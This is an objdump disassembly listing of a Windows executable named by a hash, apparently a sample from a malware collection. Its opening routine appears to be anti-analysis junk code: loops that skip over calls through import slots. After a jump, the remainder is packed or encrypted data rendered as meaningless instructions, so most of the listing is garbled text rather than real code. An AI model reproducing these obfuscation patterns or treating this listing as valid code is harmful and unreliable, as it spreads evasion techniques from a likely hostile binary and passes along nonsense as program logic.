
398f0346d09fb2b61765f9a686f24b96bd78bdd743543af11a28bf1df5ba5055.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	or     DWORD PTR ds:0x42b01c,0x3e2a
  401013:	mov    eax,DWORD PTR [ebp+0x8]
  401016:	add    DWORD PTR ds:0x42b01c,edi
  40101c:	push   ebx
  40101d:	mov    DWORD PTR ds:0x42c000,0x10
  401027:	cmp    DWORD PTR ds:0x42c000,0x0
  40102e:	je     0x401068
  401034:	cmp    DWORD PTR ds:0x42c000,0x1d
  40103b:	jb     0x401068
  401041:	jmp    0x401056
  401046:	push   0x42a000
  40104b:	push   0x42f107
  401050:	call   DWORD PTR ds:0x43000b
  401056:	mov    ecx,DWORD PTR ds:0x42c000
  40105c:	dec    ecx
  40105d:	mov    DWORD PTR ds:0x42c000,ecx
  401063:	jmp    0x401027
  401068:	push   esi
  401069:	and    esi,DWORD PTR ds:0x42d004
  40106f:	push   edi
  401070:	and    ecx,edi
  401072:	mov    esi,0x75108a4
  401077:	sub    DWORD PTR ds:0x42c008,0x273e
  401081:	xor    eax,esi
  401083:	xor    edi,edi
  401085:	xor    edi,DWORD PTR ds:0x424b25
  40108b:	mov    ecx,DWORD PTR ds:0x424b11
  401091:	sub    ecx,edi
  401093:	or     edi,DWORD PTR [edi+ecx*1]
  401096:	mov    edi,0x3272ec
  40109b:	mov    DWORD PTR ds:0x42900c,0x18d1
  4010a5:	add    eax,edi
  4010a7:	mov    DWORD PTR [ebp-0x40],eax
  4010aa:	and    DWORD PTR ds:0x42d01c,0x0
  4010b4:	xor    ecx,ecx
  4010b6:	add    ecx,DWORD PTR ds:0x42d01c
  4010bc:	inc    ecx
  4010bd:	mov    DWORD PTR ds:0x42d01c,ecx
  4010c3:	cmp    DWORD PTR ds:0x42d01c,0x21
  4010ca:	jle    0x4010f0
  4010d0:	jmp    0x4010e3
  4010d5:	push   0x42b000
  4010da:	push   DWORD PTR [ebp-0x10]
  4010dd:	call   DWORD PTR ds:0x43000f
  4010e3:	cmp    DWORD PTR ds:0x42d01c,0x16
  4010ea:	jb     0x4010b4
  4010f0:	mov    eax,ds:0x42f1eb
  4010f5:	sbb    ecx,DWORD PTR ds:0x42b014
  4010fb:	mov    eax,DWORD PTR [eax]
  4010fd:	and    DWORD PTR ds:0x42d00c,ecx
  401103:	mov    DWORD PTR [ebp-0x3c],eax
  401106:	or     eax,eax
  401108:	mov    eax,ds:0x42f3f3
  40110d:	mov    eax,DWORD PTR [eax]
  40110f:	mov    DWORD PTR [ebp-0x1c],eax
  401112:	adc    ecx,0x40bd
  401118:	mov    DWORD PTR [ebp-0x34],0xf89c87b0
  40111f:	and    DWORD PTR ds:0x42a018,0x0
  401129:	mov    ecx,DWORD PTR ds:0x42a018
  40112f:	inc    ecx
  401130:	mov    DWORD PTR ds:0x42a018,ecx
  401136:	cmp    DWORD PTR ds:0x42a018,0x1a
  40113d:	jg     0x40115b
  401143:	jmp    0x40114e
  401148:	call   DWORD PTR ds:0x430013
  40114e:	cmp    DWORD PTR ds:0x42a018,0x12
  401155:	jb     0x401129
  40115b:	mov    eax,DWORD PTR [ebp-0x34]
  40115e:	xor    eax,esi
  401160:	and    DWORD PTR ds:0x42a014,0x0
  40116a:	jmp    0x40117c
  40116f:	mov    ecx,DWORD PTR ds:0x42a014
  401175:	inc    ecx
  401176:	mov    DWORD PTR ds:0x42a014,ecx
  40117c:	cmp    DWORD PTR ds:0x42a014,0x17
  401183:	jae    0x4011cd
  401189:	cmp    DWORD PTR ds:0x42a014,0x9
  401190:	jbe    0x4011cd
  401196:	jmp    0x4011ae
  40119b:	push   0x42f19b
  4011a0:	push   DWORD PTR [ebp-0x10]
  4011a3:	push   0x271c
  4011a8:	call   DWORD PTR ds:0x430017
  4011ae:	cmp    DWORD PTR ds:0x42a014,0x8
  4011b5:	jne    0x4011c8
  4011bb:	mov    ecx,DWORD PTR ds:0x42a014
  4011c1:	inc    ecx
  4011c2:	mov    DWORD PTR ds:0x42a014,ecx
  4011c8:	jmp    0x40116f
  4011cd:	add    eax,edi
  4011cf:	mov    DWORD PTR [ebp-0x40],eax
  4011d2:	and    DWORD PTR ds:0x42a01c,0x0
  4011dc:	mov    ecx,DWORD PTR ds:0x42a01c
  4011e2:	inc    ecx
  4011e3:	mov    DWORD PTR ds:0x42a01c,ecx
  4011e9:	cmp    DWORD PTR ds:0x42a01c,0x19
  4011f0:	jge    0x40122b
  4011f6:	jmp    0x40121e
  4011fb:	push   DWORD PTR [ebp-0x24]
  4011fe:	push   DWORD PTR [ebp-0x18]
  401201:	push   0x42d008
  401206:	push   0x305c
  40120b:	push   0x63b3
  401210:	push   DWORD PTR [ebp-0x10]
  401213:	push   0x1042
  401218:	call   DWORD PTR ds:0x43001b
  40121e:	cmp    DWORD PTR ds:0x42a01c,0x12
  401225:	jb     0x4011dc
  40122b:	mov    eax,ds:0x42f36b
  401230:	movzx  ecx,BYTE PTR ds:0x42c01c
  401237:	and    DWORD PTR ds:0x42d010,ecx
  40123d:	mov    DWORD PTR [ebp-0x40],eax
  401240:	not    eax
  401242:	mov    eax,DWORD PTR [ebp-0x3c]
  401245:	sub    DWORD PTR ds:0x42d018,0x42c018
  40124f:	mov    DWORD PTR [ebp-0x14],eax
  401252:	mov    DWORD PTR ds:0x42c014,0x1c
  40125c:	cmp    DWORD PTR ds:0x42c014,0x0
  401263:	je     0x401299
  401269:	cmp    DWORD PTR ds:0x42c014,0x28
  401270:	jbe    0x401299
  401276:	jmp    0x401289
  40127b:	push   DWORD PTR [ebp-0x1c]
  40127e:	push   0x72ae
  401283:	call   DWORD PTR ds:0x430027
  401289:	mov    eax,ds:0x42c014
  40128e:	dec    eax
  40128f:	mov    ds:0x42c014,eax
  401294:	jmp    0x40125c
  401299:	mov    eax,DWORD PTR [ebp-0x14]
  40129c:	mov    ecx,DWORD PTR ds:0x42d014
  4012a2:	sub    DWORD PTR ds:0x42d004,ecx
  4012a8:	push   0x4
  4012aa:	or     DWORD PTR ds:0x42c004,0xf09
  4012b4:	pop    ecx
  4012b5:	sub    ecx,eax
  4012b7:	mov    eax,ds:0x424b68
  4012bc:	mov    eax,DWORD PTR [eax]
  4012be:	sbb    DWORD PTR ds:0x42c000,eax
  4012c4:	add    ecx,DWORD PTR [ebp-0x1c]
  4012c7:	sub    eax,0x251f
  4012cc:	mov    DWORD PTR [ebp-0x2c],0xf89c85f0
  4012d3:	jmp    0x40362f
  4012d8:	sbb    al,0x11
  4012da:	ja     0x4012ad
  4012dc:	imul   ecx,DWORD PTR [ebx+0x45619388],0xc
  4012e3:	push   esi
  4012e4:	aaa    
  4012e5:	xor    ecx,DWORD PTR [eax+0x7a7a7ad7]
  4012eb:	jp     0x401328
  4012ed:	pop    edi
  4012ee:	jp     0x40136a
  4012f0:	and    eax,0x1931272c
  4012f5:	xor    eax,0x3a752f1b
  4012fa:	imul   esi,DWORD PTR [esi+0x74],0x6d6a6a74
  401301:	inc    edx
  401302:	aad    0xdc
  401304:	icebp  
  401305:	pusha  
  401306:	dec    eax
  401307:	imul   esi,DWORD PTR [ecx+0x5b],0xffffffa0
  40130b:	jo     0x40137a
  40130d:	pop    ecx
  40130e:	iret   
  40130f:	pop    ebp
  401310:	dec    edx
  401311:	xor    BYTE PTR [edx+edi*8+0x4d678697],cl
  401318:	jg     0x401361
  40131a:	xor    BYTE PTR [esi+0x3bb2b07f],0x2c
  401321:	push   DWORD PTR [esi-0x24]
  401324:	cli    
  401325:	arpl   WORD PTR [edi+0x1e],di
  401328:	in     eax,dx
  401329:	cmp    ebp,ecx
  40132b:	mov    edx,0xde2397ed
  401330:	mov    ebp,DWORD PTR [ecx]
  401332:	mulps  xmm5,XMMWORD PTR [ebx+0x6d07d48a]
  401339:	fst    QWORD PTR [esp+eiz*8]
  40133c:	push   cs
  40133d:	cli    
  40133e:	sbb    BYTE PTR ss:[eax+0xc],cl
  401342:	imul   ebp,DWORD PTR ss:[eax-0x47],0xffffffaf
  401347:	and    edx,DWORD PTR [ecx+0x15]
  40134a:	mov    dh,0xff
  40134c:	jmp    0x42c43e9a
  401351:	enter  0xf95b,0x1a
  401355:	cli    
  401356:	js     0x401309
  401358:	jae    0x401337
  40135a:	cwde   
  40135b:	pop    edi
  40135c:	mov    esi,DWORD PTR [ecx+0x41922417]
  401362:	add    ebx,DWORD PTR [esi+0xb83823c]
  401368:	fisubr DWORD PTR ds:0x43448d62
  40136e:	fs repz iret 
  401371:	mov    ch,BYTE PTR [ecx]
  401373:	mov    eax,eax
  401375:	(bad)  
  401376:	int3   
  401377:	mov    BYTE PTR [ecx-0xc],ah
  40137a:	push   ebp
  40137b:	bound  ecx,QWORD PTR [esp+ecx*1+0x3e]
  40137f:	add    eax,DWORD PTR [esi+0x13]
  401382:	lods   eax,DWORD PTR ds:[esi]
  401383:	dec    ebx
  401384:	retf   0x40b7
  401387:	rcl    BYTE PTR [esi+eiz*2],1
  40138a:	std    
  40138b:	bound  esp,QWORD PTR [esi-0x4b]
  40138e:	stc    
  40138f:	push   0x1152f8bf
  401394:	xchg   esi,eax
  401395:	lea    edx,[ebx+0x42190fe4]
  40139b:	mov    esp,0xc4c927b7
  4013a0:	adc    dl,bl
  4013a2:	add    WORD PTR [edi],dx
  4013a5:	and    dl,BYTE PTR [edi]
  4013a7:	pop    ds
  4013a8:	neg    DWORD PTR [edx-0x75f2f48b]
  4013ae:	stc    
  4013af:	mov    eax,ds:0x5c583600
  4013b4:	test   DWORD PTR gs:[ebp-0x110c0399],edx
  4013bb:	cmp    esp,DWORD PTR [edi+0x6f2173e]
  4013c1:	enter  0x8e7b,0xfc
  4013c5:	test   DWORD PTR ds:0xa6778dc3,edx
  4013cb:	sub    DWORD PTR [esi-0x2e],0xffffffb4
  4013cf:	pop    ds
  4013d0:	mov    ebp,0x18b7f3e8
  4013d5:	dec    ecx
  4013d6:	cmp    al,0x93
  4013d8:	stos   DWORD PTR es:[edi],eax
  4013d9:	ja     0x401454
  4013db:	mov    BYTE PTR [ecx],dh
  4013dd:	call   0x41d7:0xbd9c2325
  4013e4:	jp     0x4013c7
  4013e6:	push   ebp
  4013e7:	mov    ds:0x1296fb56,eax
  4013ec:	inc    ecx
  4013ed:	push   ebx
  4013ee:	rcr    DWORD PTR [edi+edx*8+0x7b],cl
  4013f2:	xor    ch,bl
  4013f4:	(bad)  
  4013f5:	jbe    0x4013ec
  4013f7:	sahf   
  4013f8:	sahf   
  4013f9:	ja     0x40142d
  4013fb:	sahf   
  4013fc:	add    bh,al
  4013fe:	xchg   ebp,eax
  4013ff:	int3   
  401400:	in     eax,dx
  401401:	adc    eax,0x89668b83
  401406:	cmp    eax,0xac3b337a
  40140b:	stos   BYTE PTR es:[edi],al
  40140c:	xor    eax,0xf87fb6d8
  401411:	mov    al,ds:0xca1a3b36
  401416:	pop    edi
  401417:	mov    ebx,0x3ba6ffdc
  40141c:	push   cs
  40141d:	mov    bh,0xf8
  40141f:	clc    
  401420:	in     al,dx
  401421:	shr    BYTE PTR cs:[ebx+0x134b715e],1
  401428:	add    edi,DWORD PTR [edi+0x40]
  40142b:	les    esp,FWORD PTR ds:0xb5ca450f
  401431:	and    ah,BYTE PTR [edx+0x4b15588c]
  401437:	fdiv   st(2),st
  401439:	(bad)
  40143c:	ror    eax,cl
  40143e:	mov    ecx,0x93d8978
  401443:	outs   dx,DWORD PTR ds:[esi]
  401444:	pushf  
  401445:	jbe    0x401415
  401447:	retf   0xbcc4
  40144a:	sbb    dl,0x9a
  40144d:	mov    dl,0x95
  40144f:	pop    es
  401450:	sbb    al,0x21
  401452:	pusha  
  401453:	add    cl,BYTE PTR [eax+0x50]
  401456:	xlat   BYTE PTR ds:[ebx]
  401457:	mov    al,ds:0xd2e655b5
  40145c:	mov    eax,ds:0xc23ed382
  401461:	dec    edi
  401462:	xchg   ebx,eax
  401463:	stc    
  401464:	push   0xffffffd8
  401466:	mov    eax,ds:0xfb5f9775
  40146b:	mov    edi,0x67d3e3c7
  401470:	pusha  
  401471:	mov    esi,0x98bdd220
  401476:	pop    eax
  401477:	xchg   ebx,eax
  401478:	out    0x8,al
  40147a:	jecxz  0x401406
  40147c:	xchg   esi,eax
  40147d:	push   0x2e3c867b
  401482:	sbb    eax,0x1ca86754
  401487:	xor    ebp,DWORD PTR [eax-0x13eb101d]
  40148d:	stos   BYTE PTR es:[edi],al
  40148e:	sub    BYTE PTR [edx-0x34],bl
  401491:	nop
  401492:	or     BYTE PTR [esi],dh
  401494:	mov    BYTE PTR [ecx-0x176e3312],cl
  40149a:	mov    BYTE PTR [esi+0x5b],ch
  40149d:	pop    es
  40149e:	and    edi,edi
  4014a0:	std    
  4014a1:	sub    eax,esi
  4014a3:	xor    dh,BYTE PTR [ecx-0x710a1d63]
  4014a9:	cdq    
  4014aa:	adc    ecx,edi
  4014ac:	and    bl,BYTE PTR [edi+0x3f14cf7d]
  4014b2:	xchg   esi,eax
  4014b3:	push   ds
  4014b4:	xchg   DWORD PTR [edi+0x3c63c733],esi
  4014ba:	cmp    al,0x5f
  4014bc:	fptan  
  4014be:	sti    
  4014bf:	test   bh,0x27
  4014c2:	pop    ecx
  4014c3:	mov    al,0x82
  4014c5:	ja     0x40144b
  4014c7:	dec    esi
  4014c8:	daa    
  4014c9:	stos   DWORD PTR es:[edi],eax
  4014ca:	inc    edx
  4014cb:	xor    BYTE PTR [esi+0x3b745ada],bh
  4014d1:	and    bl,BYTE PTR [ecx-0x5a]
  4014d4:	sub    edi,DWORD PTR [eax+eax*4]
  4014d7:	adc    al,0x6f
  4014d9:	dec    edx
  4014da:	outs   dx,BYTE PTR ds:[esi]
  4014db:	stos   DWORD PTR es:[edi],eax
  4014dc:	push   ds
  4014dd:	mov    dh,0xcd
  4014df:	jle    0x401488
  4014e1:	and    eax,0x1ea443cf
  4014e6:	out    dx,eax
  4014e7:	cmp    DWORD PTR ds:0x1312eb77,esi
  4014ed:	leave  
  4014ee:	cmp    DWORD PTR [esi-0x655b5af],edi
  4014f4:	sbb    bh,0xc6
  4014f7:	cmp    DWORD PTR [edx-0x27],0x5f
  4014fb:	les    esi,FWORD PTR [edi+0x76aef96f]
  401501:	jo     0x401514
  401503:	jmp    0x9911036c
  401508:	fadd   st(5),st
  40150a:	rcl    DWORD PTR cs:[edi],cl
  40150d:	cmp    eax,0x3c47e9f8
  401512:	xchg   edx,eax
  401513:	imul   esi,DWORD PTR [esi-0x76],0x6ce5b80a
  40151a:	mov    eax,ds:0x42a95fce
  40151f:	hlt    
  401520:	xchg   esp,eax
  401521:	je     0x401578
  401523:	iret   
  401524:	fadd   st(2),st
  401526:	dec    ecx
  401527:	cmp    bl,al
  401529:	pop    ebx
  40152a:	mov    ah,0x87
  40152c:	xchg   edx,eax
  40152d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40152e:	pop    ss
  40152f:	dec    ebp
  401530:	outs   dx,BYTE PTR ds:[esi]
  401531:	out    0x74,eax
  401533:	adc    BYTE PTR [ecx],al
  401535:	(bad)  
  401536:	and    BYTE PTR [esi-0x584fe9b],al
  40153c:	jmp    0x40157a
  40153e:	inc    ebx
  40153f:	fs aam 0x54
  401542:	mov    bl,0xac
  401544:	repz popa 
  401546:	adc    DWORD PTR [ebx-0x69d4451e],ecx
  40154c:	icebp  
  40154d:	mov    al,ds:0xd98e381c
  401552:	xor    DWORD PTR [ebx],0x10
  401555:	jmp    0x5d80:0xd1d72380
  40155c:	mov    dl,0xd5
  40155e:	test   eax,0xbf88e8a4
  401563:	cmp    edi,DWORD PTR [edi+0x71]
  401566:	loop   0x40159a
  401568:	inc    esp
  401569:	sahf   
  40156a:	mov    al,ah
  40156c:	mov    eax,DWORD PTR [esi+0x2719be57]
  401572:	sbb    ah,ch
  401574:	jno    0x40152c
  401576:	popa   
  401577:	sar    DWORD PTR [ecx+0x18],cl
  40157a:	push   edi
  40157b:	xchg   BYTE PTR [edx],dh
  40157d:	or     al,0x3d
  40157f:	or     BYTE PTR [esi],0x72
  401582:	rcr    BYTE PTR [ebx-0x77],cl
  401585:	or     BYTE PTR [eax+0x3b0b9f47],cl
  40158b:	cmp    al,0xca
  40158d:	xchg   ebx,eax
  40158e:	call   0x1546:0x3ac0afc1
  401595:	xchg   ecx,eax
  401596:	loopne 0x401581
  401598:	mov    BYTE PTR [edi],bl
  40159a:	add    DWORD PTR [ebp-0x3a],edx
  40159d:	repnz std 
  40159f:	mov    ah,0xa1
  4015a1:	fld    DWORD PTR [edi+0x6b]
  4015a4:	adc    eax,DWORD PTR [edi]
  4015a6:	xlat   BYTE PTR ds:[ebx]
  4015a7:	mov    bh,0x37
  4015a9:	push   edx
  4015aa:	mov    ecx,0xe3a73754
  4015af:	pop    ds
  4015b0:	push   esp
  4015b1:	pop    ebx
  4015b2:	fimul  WORD PTR [ecx-0x2a874842]
  4015b8:	lea    edi,[ebx-0x6a]
  4015bb:	pop    ebp
  4015bc:	sbb    esp,DWORD PTR [edx]
  4015be:	fisttp WORD PTR [ebp-0x60835744]
  4015c4:	mov    ?,WORD PTR [esi-0x3a4d3720]
  4015ca:	mov    ebp,0xc888ae06
  4015cf:	cli    
  4015d0:	add    BYTE PTR [esi],al
  4015d2:	ret    0x64
  4015d5:	aam    0x6
  4015d7:	fnsave [edi-0x2b]
  4015da:	adc    bl,BYTE PTR [edi+0x30754c0e]
  4015e0:	out    0x15,eax
  4015e2:	jbe    0x40164e
  4015e4:	adc    eax,0x229e9527
  4015e9:	push   esi
  4015ea:	es xchg edi,eax
  4015ec:	imul   edx,DWORD PTR [edx+0x104c883],0x8
  4015f3:	fistp  QWORD PTR [esi+0x5856d3a4]
  4015f9:	pop    esi
  4015fa:	xor    BYTE PTR [ebp+0x2bbc71bc],cl
  401600:	(bad)  
  401601:	mov    eax,ds:0x1cbe33e8
  401606:	inc    edi
  401607:	test   DWORD PTR [eax+0x4f],ecx
  40160a:	mov    bl,0xae
  40160c:	xor    eax,0x2070de4
  401611:	cmp    ebx,edx
  401613:	jno    0x401641
  401615:	mov    ah,0x35
  401617:	pop    ss
  401618:	cmp    DWORD PTR [edx],ebp
  40161a:	add    al,0x49
  40161c:	sub    DWORD PTR [edx*1+0x355a0df2],ebx
  401623:	sbb    al,0x75
  401625:	inc    eax
  401626:	loopne 0x40163b
  401628:	and    ecx,eax
  40162a:	mov    WORD PTR [eax+0x191d1fc4],fs
  401630:	out    dx,al
  401631:	xchg   DWORD PTR [eax+edx*8-0x5fdb5e1f],edx
  401638:	inc    edi
  401639:	es mov ah,0x1b
  40163c:	nop
  40163d:	xchg   DWORD PTR [ecx],edi
  40163f:	sub    ebp,ecx
  401641:	mov    dh,ch
  401643:	ret    0x878
  401646:	outs   dx,BYTE PTR ds:[esi]
  401647:	mov    ebp,0x577f8763
  40164c:	cmc    
  40164d:	and    eax,0xc4c7aa53
  401652:	add    dh,BYTE PTR [ecx]
  401654:	cmp    eax,0x78b3e81c
  401659:	cs add ecx,eax
  40165c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40165d:	into   
  40165e:	jb     0x401683
  401660:	ins    DWORD PTR es:[edi],dx
  401661:	sbb    DWORD PTR gs:[ebp+0x58cc47ac],0xffffffd8
  401669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40166a:	stos   BYTE PTR es:[edi],al
  40166b:	retf   
  40166c:	mov    ?,WORD PTR [ecx-0x111d7ed8]
  401672:	cmc    
  401673:	cdq    
  401674:	dec    eax
  401675:	push   ebx
  401676:	aaa    
  401677:	and    ah,al
  401679:	(bad)  
  40167a:	out    0xe1,eax
  40167c:	mov    BYTE PTR [esi+eiz*2-0x6b],bl
  401680:	cmp    dl,dh
  401682:	(bad)  
  401683:	jb     0x4016a8
  401685:	pop    ebp
  401686:	enter  0xa60,0xf7
  40168a:	push   esp
  40168b:	sub    bh,BYTE PTR [eax-0x5a]
  40168e:	(bad)
  401693:	inc    esi
  401694:	mov    cl,0x2a
  401696:	out    0x83,eax
  401698:	dec    esi
  401699:	outs   dx,DWORD PTR ds:[esi]
  40169a:	fcom   st(6)
  40169c:	ja     0x40162d
  40169e:	arpl   WORD PTR [ebx-0xc],si
  4016a1:	mov    ch,0x50
  4016a3:	out    dx,al
  4016a4:	js     0x40164e
  4016a6:	or     ebp,DWORD PTR es:[edi-0x7d8bb0d9]
  4016ad:	pop    ebp
  4016ae:	dec    edx
  4016af:	push   0xf3551cb6
  4016b4:	mov    eax,ds:0x243beb68
  4016b9:	jge    0x40166e
  4016bb:	iret   
  4016bc:	fld    TBYTE PTR [esi-0x9]
  4016bf:	sbb    BYTE PTR [eax+0x2e68a3c2],0x3
  4016c6:	xor    eax,DWORD PTR [edx]
  4016c8:	call   0xb960:0xa80bbbb4
  4016cf:	fldcw  WORD PTR [ebp-0x52]
  4016d2:	push   es
  4016d3:	mov    esp,0x74544841
  4016d8:	data16 mov ah,0x47
  4016db:	add    esp,ecx
  4016dd:	(bad)  
  4016de:	in     al,0xdd
  4016e0:	add    eax,0x106899f4
  4016e5:	cmp    dl,cl
  4016e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016e8:	scas   eax,DWORD PTR es:[edi]
  4016e9:	pop    ebp
  4016ea:	xor    BYTE PTR [edi-0x4baec45c],0xf4
  4016f1:	(bad)  
  4016f2:	cli    
  4016f3:	ror    BYTE PTR [esp+ebp*2],cl
  4016f6:	fsubr  QWORD PTR [ebp+ecx*4+0x5c7c5a2b]
  4016fd:	ss dec ebx
  4016ff:	pop    eax
  401700:	push   edi
  401701:	jae    0x4016c3
  401703:	mov    ecx,0x218cd3b2
  401708:	imul   esp,DWORD PTR [esi-0xe8f1fe8],0xffffff90
  40170f:	push   0xffffffbb
  401711:	pop    edi
  401712:	pop    es
  401713:	in     eax,0xb
  401715:	add    esi,DWORD PTR [ebx]
  401717:	out    0xb4,al
  401719:	arpl   WORD PTR [edi-0x189720cb],sp
  40171f:	push   cs
  401720:	xchg   esi,eax
  401721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401722:	mov    edi,0x3af5c7ec
  401727:	out    dx,eax
  401728:	adc    ch,0x51
  40172b:	xlat   BYTE PTR ds:[ebx]
  40172c:	dec    edi
  40172d:	pop    edx
  40172e:	rol    BYTE PTR ds:0xce728651,1
  401734:	mov    ebx,0x2f20118b
  401739:	iret   
  40173a:	fwait
  40173b:	cdq    
  40173c:	mov    dh,0xd6
  40173e:	loop   0x401798
  401740:	stos   DWORD PTR es:[edi],eax
  401741:	ds pop ds
  401743:	imul   eax,DWORD PTR [ebx-0x4026649d],0xa8dc6835
  40174d:	js     0x4017c4
  40174f:	cld    
  401750:	pusha  
  401751:	and    DWORD PTR [eax+0x28ff6e5c],ebx
  401757:	sbb    DWORD PTR [ecx+0x30baadf2],esp
  40175d:	test   BYTE PTR [ebx-0x4fb1090],ah
  401763:	push   0xffffff90
  401765:	loopne 0x4017bd
  401767:	mov    dl,al
  401769:	adc    BYTE PTR [ebx+edi*2-0x164adefb],0xfd
  401771:	adc    eax,edx
  401773:	dec    edx
  401774:	sti    
  401775:	cld    
  401776:	out    dx,eax
  401777:	push   es
  401778:	test   al,0xfd
  40177a:	imul   ecx,DWORD PTR [ebx],0xffffffac
  40177d:	jo     0x4017ad
  40177f:	clc    
  401780:	inc    ebp
  401781:	jle    0x40179b
  401783:	or     DWORD PTR [eax],ebp
  401785:	cwde   
  401786:	sub    ch,BYTE PTR [ebx-0x3f906dc9]
  40178c:	cld    
  40178d:	scas   al,BYTE PTR es:[edi]
  40178e:	and    esi,DWORD PTR [ecx]
  401790:	push   esp
  401791:	js     0x401781
  401793:	cvtdq2ps xmm2,XMMWORD PTR [ecx+0xe7d0999]
  40179a:	mov    al,0x12
  40179c:	cwde   
  40179d:	clc    
  40179e:	shl    BYTE PTR [edi-0x6ddb50c1],cl
  4017a4:	mov    ebp,0xcd6f3650
  4017a9:	sbb    esp,esp
  4017ab:	aaa    
  4017ac:	add    BYTE PTR [ebx-0x73],ah
  4017af:	pushf  
  4017b0:	sub    eax,0xc9f1d725
  4017b5:	out    dx,eax
  4017b6:	adc    ebp,DWORD PTR [esi]
  4017b8:	retf   
  4017b9:	fmul   DWORD PTR [ebx+ecx*2+0x42]
  4017bd:	and    DWORD PTR [ebx],edi
  4017bf:	hlt    
  4017c0:	xchg   ebp,eax
  4017c1:	push   0xd54c6272
  4017c6:	lods   al,BYTE PTR ds:[esi]
  4017c7:	repnz sbb BYTE PTR [edx+0x5340ebb5],bl
  4017ce:	pop    eax
  4017cf:	fild   WORD PTR [ebx+ebx*2-0x5a0a9c91]
  4017d6:	repz mov ebp,0x3f9c1d3c
  4017dc:	xchg   BYTE PTR [ecx-0x67e51f96],ch
  4017e2:	cli    
  4017e3:	inc    ecx
  4017e4:	xchg   esp,eax
  4017e5:	sbb    bh,ch
  4017e7:	or     eax,0xe917c35e
  4017ec:	jb     0x401783
  4017ee:	dec    eax
  4017ef:	js     0x401864
  4017f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017f3:	retf   
  4017f4:	jg     0x40177e
  4017f6:	inc    ecx
  4017f7:	add    bl,dl
  4017f9:	add    ah,BYTE PTR [ebx-0x71]
  4017fc:	repz daa 
  4017fe:	cwde   
  4017ff:	ret    
  401800:	retf   
  401801:	add    eax,0x8d48be3e
  401806:	xor    eax,0x9b14da9b
  40180b:	aad    0x6
  40180d:	lods   al,BYTE PTR ds:[esi]
  40180e:	mov    cl,0xa
  401810:	cmp    edi,DWORD PTR [edi-0x68]
  401813:	int3   
  401814:	idiv   dh
  401816:	adc    BYTE PTR [edx],dh
  401818:	sti    
  401819:	adc    dl,BYTE PTR [ecx-0x49]
  40181c:	xchg   ah,al
  40181e:	pop    ss
  40181f:	sbb    DWORD PTR [esi+eiz*1],ecx
  401822:	in     eax,dx
  401823:	inc    esp
  401824:	sbb    esp,DWORD PTR [eax-0x4]
  401827:	cdq    
  401828:	add    al,0x6c
  40182a:	iret   
  40182b:	xchg   edx,eax
  40182c:	cmp    eax,0xce5e7558
  401831:	and    esp,DWORD PTR [ebx+edi*1+0x5f3653d9]
  401838:	jae    0x401817
  40183a:	cmc    
  40183b:	sbb    dh,BYTE PTR [edi]
  40183d:	inc    ecx
  40183e:	push   0xffffffed
  401840:	sahf   
  401841:	jp     0x401805
  401843:	cmp    dh,BYTE PTR [ebp+0x5c]
  401846:	xor    dh,BYTE PTR [esi+eiz*8]
  401849:	dec    eax
  40184a:	adc    al,0x30
  40184c:	sahf   
  40184d:	dec    edi
  40184e:	in     al,dx
  40184f:	pusha  
  401850:	add    BYTE PTR [esi+0x44],0x0
  401854:	jecxz  0x40185e
  401856:	jb     0x401813
  401858:	adc    DWORD PTR [eax],ebp
  40185a:	jmp    0x40180d
  40185c:	push   edi
  40185d:	xchg   edi,eax
  40185e:	(bad)  
  40185f:	pop    esp
  401860:	popf   
  401861:	cmp    ebx,DWORD PTR [esp+esi*2-0x571b6abc]
  401868:	lods   al,BYTE PTR ds:[esi]
  401869:	aad    0xe3
  40186b:	es jmp 0x10a5:0xacd15fe3
  401873:	and    BYTE PTR [eax+eax*2],al
  401876:	xor    dh,BYTE PTR [esi-0x2488c98]
  40187c:	jp     0x40184d
  40187e:	stos   BYTE PTR es:[edi],al
  40187f:	sub    ah,BYTE PTR [edx+0x203ed66e]
  401885:	sbb    BYTE PTR [ebx],ch
  401887:	test   al,0x5f
  401889:	inc    esp
  40188a:	mov    ds:0xd33dad4b,eax
  40188f:	push   0x77aab400
  401894:	pop    ecx
  401895:	jge    0x4018bb
  401897:	ficom  WORD PTR [ebx-0x19]
  40189a:	lods   al,BYTE PTR ds:[esi]
  40189b:	xor    eax,0xe07f1f2d
  4018a0:	sbb    BYTE PTR [ebx+0x4a],bh
  4018a3:	sbb    dh,BYTE PTR [eax]
  4018a5:	dec    ecx
  4018a6:	stos   DWORD PTR es:[edi],eax
  4018a7:	push   ss
  4018a8:	mov    ecx,0x6ef7c1e6
  4018ad:	imul   edi,edx,0xffffffbd
  4018b0:	xor    BYTE PTR [esi-0x5e7d02a8],0x64
  4018b7:	call   FWORD PTR [edi]
  4018b9:	rcr    DWORD PTR [ebx-0x7e2aa156],cl
  4018bf:	xor    eax,DWORD PTR [eax+0x5558a1c4]
  4018c5:	xchg   ebp,eax
  4018c6:	xor    esp,DWORD PTR [esi+ecx*2]
  4018c9:	test   al,0xcb
  4018cb:	push   cs
  4018cc:	loop   0x4018f7
  4018ce:	std    
  4018cf:	data16 and al,0x35
  4018d2:	adc    esp,edx
  4018d4:	jo     0x4018cc
  4018d6:	dec    edx
  4018d7:	or     ebx,ebx
  4018d9:	sti    
  4018da:	jbe    0x40185d
  4018dc:	adc    dl,ch
  4018de:	mov    ecx,0x9dbde073
  4018e3:	push   edi
  4018e4:	mov    ds:0xf0d5bb95,al
  4018e9:	jns    0x401895
  4018eb:	sbb    esp,esi
  4018ed:	icebp  
  4018ee:	inc    ecx
  4018ef:	mov    eax,ds:0xb8ac58fb
  4018f4:	ja     0x401919
  4018f6:	xor    DWORD PTR [esi+eiz*4],esp
  4018f9:	icebp  
  4018fa:	out    dx,eax
  4018fb:	pop    ss
  4018fc:	(bad)  
  4018fd:	dec    edi
  4018fe:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  401900:	into   
  401901:	xlat   BYTE PTR ds:[ebx]
  401902:	es mov edi,0x28c7639a
  401908:	std    
  401909:	or     dh,BYTE PTR [eax]
  40190b:	arpl   WORD PTR [eax+0x59ade915],bp
  401911:	or     dh,BYTE PTR [esi+0x32]
  401914:	mov    esi,0xa3114b8d
